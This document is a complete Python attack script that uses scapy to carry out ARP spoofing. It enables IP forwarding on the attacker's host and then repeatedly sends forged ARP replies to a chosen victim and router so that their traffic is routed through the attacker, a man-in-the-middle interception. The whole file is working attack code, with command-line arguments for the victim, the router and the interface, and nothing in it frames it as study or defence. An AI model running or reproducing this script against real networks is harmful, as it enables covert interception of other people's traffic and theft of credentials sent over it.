#!/usr/bin/env python3
from scapy.all import *
import time
import os

def arp_spoof(victim_ip, router_ip, interface):
    try:
        print(f"[+] ARP-spoofing: victim {victim_ip}, router {router_ip}")
        while True:

            send(ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=getmacbyip(router_ip)), iface=interface, verbose=0)

            send(ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=getmacbyip(victim_ip)), iface=interface, verbose=0)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] ARP-spoofing stop.")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victim", required=True, help="IP victim")
    parser.add_argument("-r", "--router", required=True, help="IP router")
    parser.add_argument("-i", "--interface", required=True, help="Network interface (eth0)")
    args = parser.parse_args()

    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    arp_spoof(args.victim, args.router, args.interface)
